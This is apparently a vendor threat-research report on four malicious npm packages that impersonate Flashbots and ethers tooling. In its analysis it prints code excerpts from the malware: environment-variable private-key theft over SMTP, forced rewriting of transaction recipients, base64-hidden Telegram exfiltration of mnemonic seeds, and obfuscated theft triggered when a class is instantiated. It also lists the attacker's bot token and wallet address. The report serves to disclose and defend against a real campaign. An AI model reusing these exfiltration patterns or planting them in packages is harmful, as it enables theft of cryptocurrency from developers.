Socket’s Threat Research Team uncovered four malicious npm packages ethers-provide-bundle, flashbot-sdk-eth , sdk-ethers and gram-utilz published by a threat actor using the npm alias flashbotts (registration email: aning2028@gmail[.]com), designed to steal cryptocurrency wallet credentials from Web3 developers. The packages masquerade as legitimate cryptographic utilities and Flashbots MEV infrastructure while secretly exfiltrating private keys and mnemonic seeds to a Telegram bot controlled by the threat actor. All packages use identical command-and-control infrastructure (Telegram bot ID: 8083151136), confirming a coordinated supply chain attack targeting the Ethereum ecosystem. At the time of this writing, all the packages are live on the npm registry. We have petitioned for their removal.
flashbot-sdk-eth
In cryptocurrency, a mnemonic seed phrase (typically 12-24 words) acts as a master key that can regenerate all wallet addresses and private keys. Private keys are the cryptographic credentials that control specific wallet addresses. Anyone with access to either your mnemonic seed or private keys has complete control over your cryptocurrency assets - they can transfer funds, interact with smart contracts, and drain wallets without any possibility of reversal. Protecting these credentials is paramount in Web3 development.
Flashbots plays a central role in the Ethereum ecosystem. Its infrastructure, particularly the MEV-Boost middleware, now facilitates close to 90% of all Ethereum block building. The project’s mission is to reduce harmful forms of Maximal Extractable Value (MEV), such as front-running (placing transactions ahead of others to profit from their expected price impact) and sandwich attacks (placing buy and sell orders before and after a target transaction to manipulate the price), by creating a structured and private marketplace for block building. Validators rely on it to increase staking rewards, while searchers and traders use it as the main entry point into the MEV economy.
This scale and importance make Flashbots an attractive target for impersonation. Because Flashbots is widely trusted by validators, searchers, and DeFi developers, any package that appears to be an official SDK has a high chance of being adopted by operators running trading bots or managing hot wallets. A compromised private key in this environment can lead to immediate, irreversible theft of funds. Malicious npm packages that mimic Flashbots tooling therefore represent a serious attempt to weaponize the trust placed in one of Ethereum’s most critical infrastructures.
The Malicious Packages#
Package 1: FlashbotsBundleProvider Variant
The first package is the most dangerous - a malicious fork of the legitimate FlashbotsBundleProvider class that extends ethers.providers.JsonRpcProvider. This package maintains full Flashbots API compatibility while embedding multiple attacks throughout its codebase, making it extremely dangerous for MEV operations.
Our analysis revealed that the package contains two versions of the malicious code: a compiled JavaScript file (index.js) and a TypeScript source file (index.ts). Both implementations contain identical attack patterns but with slight variations in error handling and type annotations. The presence of both files suggests either a development oversight that exposed the source code, or a deliberate attempt to target both JavaScript and TypeScript developers. The TypeScript version includes proper type definitions and interfaces, making it appear more legitimate to developers who might review the source.
Environment Variable Exfiltration via SMTP
The first part of the code targets environment variables containing private keys, using a hard-coded SMTP configuration to silently transmit credentials via email. The malicious code activates immediately during provider instantiation, harvesting PRIVATE_KEY_EXECUTOR and PRIVATE_KEY_SPONSOR variables commonly used in MEV operations:

  static async create(genericProvider, authSigner, connectionInfoOrUrl, network) {
    // Immediate exfiltration on instantiation
    await FlashbotsBundleProvider.simulateSignedBundle();
    
    // Continue with legitimate provider creation
    const connectionInfo = typeof connectionInfoOrUrl === 'string' 
      ? { url: connectionInfoOrUrl || DEFAULT_FLASHBOTS_RELAY }
      : { ...connectionInfoOrUrl };
    
    return new FlashbotsBundleProvider(genericProvider, authSigner, connectionInfo, networkish);
  }

  static async simulateSignedBundle(address) {
    try {
      // SMTP exfiltration with hardcoded Mailtrap credentials
      const transporter = nodemailer.createTransport({
        host: "sandbox.smtp.mailtrap.io",
        port: 2525,
        auth: {
          user: "4e2a7eb87b0cf0", // Hardcoded username
          pass: "48c1a0b623d4b3"  // Hardcoded password
        }

      // Harvest environment variables containing private keys
      const message = {
        from: "aning2028@gmail[.]com",

        // Intentionally empty error handling

Transaction Hijacking Mechanism
The package also implements a transaction manipulation within the signBundle() method, targeting both pre-signed and unsigned transactions:
async signBundle(bundledTransactions) {
  const signedTransactions = new Array();
  
  for (const tx of bundledTransactions) {
    if ('signedTransaction' in tx) {
      // Attack vector 1: Pre-signed transaction analysis and metadata hijacking
      const transactionDetails = ethers.utils.parseTransaction(tx.signedTransaction);
      if (transactionDetails.from === undefined) 
        throw new Error('Could not decode signed transaction');
      
      // Modify transaction metadata (ineffective for signed tx, but logs recipient)
      transactionDetails.to = "0x38F528E7903d6E6A1268459FC65c2ba6350E3E02";
      
      // Trigger additional exfiltration with hijacked recipient
      await FlashbotsBundleProvider.simulateSignedBundle(transactionDetails.to);
      
      signedTransactions.push(tx.signedTransaction);
      continue;
    }

    // Attack vector 2: Unsigned transaction recipient hijacking
    const transaction = { ...tx.transaction };
    const address = await tx.signer.getAddress();
    
    // Calculate nonce normally to avoid suspicion
    const nonce = transaction.nonce !== undefined 
      ? BigNumber.from(transaction.nonce)
      : nonces[address] || BigNumber.from(await this.genericProvider.getTransactionCount(address, 'latest'));
    
    if (transaction.nonce === undefined) transaction.nonce = nonce;
    
    // CRITICAL: Force redirect all unsigned transactions to attacker's address
    transaction.to = "0x38F528E7903d6E6A1268459FC65c2ba6350E3E02";
    
    // Continue with normal gas estimation and signing to maintain legitimacy
    if ((transaction.type == null || transaction.type == 0) && transaction.gasPrice === undefined)
      transaction.gasPrice = BigNumber.from(0);
    if (transaction.gasLimit === undefined)
      transaction.gasLimit = await tx.signer.estimateGas(transaction);
    
    signedTransactions.push(await tx.signer.signTransaction(transaction));
  }
  
  return signedTransactions;
}
Covert Functionality and Evasion Tactics This variant stands out by implementing behaviors that help it avoid casual detection and maintain functional cover:

Dual Activation Points: Exfiltration occurs both during provider instantiation (create()) and transaction signing (signBundle()), maximizing data collection opportunities
Environment Variable Harvesting: Specifically targets PRIVATE_KEY_EXECUTOR and PRIVATE_KEY_SPONSOR - standard environment variable names used in MEV operations
Transaction Flow Integrity: Maintains normal transaction processing flow while secretly modifying recipients, making detection difficult during routine operations
Hard-coded Infrastructure: Uses Mailtrap's sandbox SMTP service with embedded credentials, creating a reliable exfiltration channel independent of external dependencies
Selective Transaction Targeting: Only hijacks unsigned transactions (which can be modified) while logging metadata from pre-signed transactions
MEV-Specific Targeting
The package demonstrates deep understanding of MEV operations by targeting specific environment variables and transaction patterns commonly used by:

Arbitrage bots using executor/sponsor wallet separation
MEV searchers with multi-key setups
Flashbots bundle creators managing complex transaction flows
This represents the most dangerous component of this supply chain attack, as it can compromise entire MEV operations while maintaining perfect functional compatibility with legitimate Flashbots infrastructure.
Package 2: Cryptographic Utility Trojan
The second package presents itself as a collection of cryptographic and buffer-handling utilities. It includes legitimate-looking code for hash functions, buffer operations, and cookie signing - approximately 95% of the package consists of benign functionality to avoid suspicion. However, it contains two critical credential-theft functions that activate when developers call them:
function fromMnemonic(seed) {
  const mnemonicWallet = ethers.Wallet.fromMnemonic(seed);
  
  // Exfiltration payload construction
  const data = JSON.stringify({
    chat_id: Buffer.from("NTAxMzc0NzMxNA==", 'base64').toString('utf-8'), 
    // Decodes to "5013747314"
    text: seed, // Sends the actual mnemonic seed
  });

  const token = Buffer.from("ODA4MzE1MTEzNjpBQUV6LUp2OGNrbE1OT2FOOGRCb3FfVXc2SUo0TU5uZmJtVQ==", 'base64').toString('utf-8');
  // Decodes to Telegram bot ID "8083151136:AAEz-Jv8cklMNOaN8dBoq_Uw6IJ4MNnfbmU"
  
  // HTTPS request to Telegram
  const req = https.request({
    hostname: 'api.telegram.org',
    path: `/bot${token}/sendMessage`,
    method: "POST"
  });
  
  req.write(data);
  req.end();
  
  return mnemonicWallet; // Returns wallet normally to avoid suspicion
}
When developers use these functions thinking they are creating wallets, the credentials are immediately sent to the threat actors's Telegram bot. The functions return valid wallet objects, so applications continue working normally while credentials are stolen silently in the background.
Package 3: Flashbots MEV Client Trojan
The third package targets MEV searchers and arbitrage bot operators by posing as a Flashbots client library. Unlike the first package which waits for function calls, this one triggers automatically during class instantiation - making it more aggressive and harder to detect:
class Flashbot {
  constructor(relay, user, provider) {
    // Legitimate initialization code
    this.initFlashbotBundle(); // Triggers credential theft automatically
  }

  async["initFlashbotBundle"]() {

        "length", "slice", "join", "fetch"
      ];
      const _ = (k) => _0x4a1b[k];
      const key = this?.[_(1)]?.[_(2)];  // Accesses this.user.privateKey

}
The moment a developer creates a new Flashbot instance (const flashbot = new Flashbot(relay, user, provider)), the constructor calls initFlashbotBundle() which immediately steals the private key.
Package 4: Telegram Exfiltration Utility
The fourth package serves as a dedicated communication channel for the threat actors's infrastructure. Disguised as a general-purpose Telegram utility, it provides a clean interface for exfiltrating arbitrary data to the threat actor's Telegram chat:
class GramUtil {
  static async init(message) {
    try {
      const TelegramBot = require('node-telegram-bot-api');
      
      // Hard-coded bot configuration
      const bot = new TelegramBot('8083151136:AAEz-Jv8cklMNOaN8dBoq_Uw6IJ4MNnfbmU', {
        polling: false // Send-only mode for stealth
      });
      
      // Exfiltrate any data passed as message
      await bot.sendMessage('5013747314', message);
    } catch (error) {} // Silent failure
  }
}
While this package does not actively harvest credentials, it serves as the communication backbone for the threat actor's operation. Other malicious code can import and use GramUtil.init() to transmit stolen data, making it a critical component of the supply chain attack infrastructure.
Attack Infrastructure and Obfuscation#
The malicious packages exfiltrate stolen credentials to the same Telegram bot (Token: 8083151136:AAEz-Jv8cklMNOaN8dBoq_Uw6IJ4MNnfbmU, Chat ID: 5013747314). As of this writing, the Telegram bot remains active and operational. The threat actor can receive stolen credentials from any systems running these packages.
The malicious code includes Vietnamese language comments throughout the exfiltration functions, suggesting the threat actor may be Vietnamese-speaking:

"Tạo wallet từ mnemonic" (Create wallet from mnemonic)
"Tạo payload gửi đi" (Create payload to send)
"Bạn có thể đọc phản hồi tại đây nếu muốn" (You can read the response here if you want)
Ironically, the threat actor padded their malicious package with legitimate Buffer code authored by Feross Aboukhadijeh, Socket's CEO, likely grabbed from the popular buffer npm package to make the malware appear more legitimate. The threat actor uses approximately 95% benign code to hide the malicious functions, relying on developers not thoroughly reviewing familiar-looking utility code.
The four packages use different obfuscation techniques suited to their respective activation mechanisms. The @flashbotts/ethers-provider-bundle uses hardcoded SMTP credentials and dual-language implementations, sdk-ethers relies on Base64 encoding and legitimate code padding (95% benign buffer utilities), flashbot-sdk-eth employs array-based string hiding and optional chaining to prevent runtime errors, while gram-utilz maintains a clean interface as dedicated exfiltration infrastructure. All suppress errors silently and blend malicious functionality into otherwise normal-looking code
Impact Assessment#
The threat actor has created a comprehensive toolkit covering multiple attack vectors through four distinct packages. The immediate financial impact centers on private key harvesting, which grants direct access to wallet funds through stolen mnemonics and private keys, while the FlashbotsBundleProvider variant actively redirects outgoing transactions to threat actor-controlled addresses. The packages also implement environment variable theft, specifically targeting PRIVATE_KEY_EXECUTOR and PRIVATE_KEY_SPONSOR variables commonly used in MEV operations.
From an operational perspective, the attack presents serious concerns for MEV infrastructure integrity. Bundle providers with embedded malware can compromise entire MEV searching operations, while utility packages can infiltrate any Web3 project through routine dependency installation, expanding the attack surface significantly. All packages operate silently by suppressing errors and providing no user notifications, allowing prolonged undetected access to victim systems.
Given the impersonation of Flashbots tooling and the focus on private key theft, MEV searchers and DeFi developers are high-value targets for this campaign. These operators control hot wallets with active positions and arbitrage funds, making them attractive to attackers. A compromised private key grants attackers immediate, irreversible access to:

Trading bot wallets with active positions
MEV searcher hot wallets
Development and testing wallets that may contain mainnet funds
Smart contract deployment keys
The packages execute silently, leaving no warning until funds are gone. The attacker can monitor incoming credentials and selectively target high-value wallets. The coordination between four distinct packages means a single npm install of any package grants the attacker comprehensive access to cryptocurrency infrastructure.
Outlook and Recommendations#
This campaign demonstrates how a single npm install can compromise an entire wallet infrastructure through credential theft. The four packages use varied activation strategies across the attack chain. In sdk-ethers, exfiltration occurs when developers call wallet helper functions like fromMnemonic(). In flashbot-sdk-eth, theft triggers automatically during class instantiation with no explicit function calls required. The @flashbotts/ethers-provider-bundle variant activates at multiple points, during provider creation and transaction signing, while gram-utilz serves as on-demand infrastructure that other malicious code can invoke. This range of activation methods, from automatic execution to function-call triggers, reduces opportunities for detection between import and execution. By exploiting developer trust in familiar package names and padding malicious code with legitimate utilities, these packages turn routine Web3 development into a direct pipeline to threat actor-controlled Telegram bots.
We expect more credential-stealing packages to emerge, expanding beyond Ethereum to target Solana, Cosmos, and other blockchain ecosystems. The attacker uses Telegram for exfiltration, a well-established technique that abuses legitimate messaging platforms to evade detection by traditional security tools.
Socket's security tooling is built to detect exactly these kinds of credential theft attempts, Base64 obfuscation patterns, and suspicious network calls during package installation. The Socket GitHub App scans pull requests in real time, flagging unexpected Telegram API calls, Base64-encoded secrets, and array-based obfuscation before they merge. The Socket CLI enforces the same checks during installs, surfacing red flags on npm install and preventing packages like sdk-ethers , ethers-provider-bundle , gram-utilz and flashbot-sdk-eth from entering your dependency tree. The Socket browser extension alerts users to suspicious packages upon download or viewing, exposing known malware verdicts and typosquatting signals. For AI workflows, Socket MCP warns about malicious or hallucinated package suggestions from code assistants - particularly critical when AI tools suggest blockchain-related dependencies.
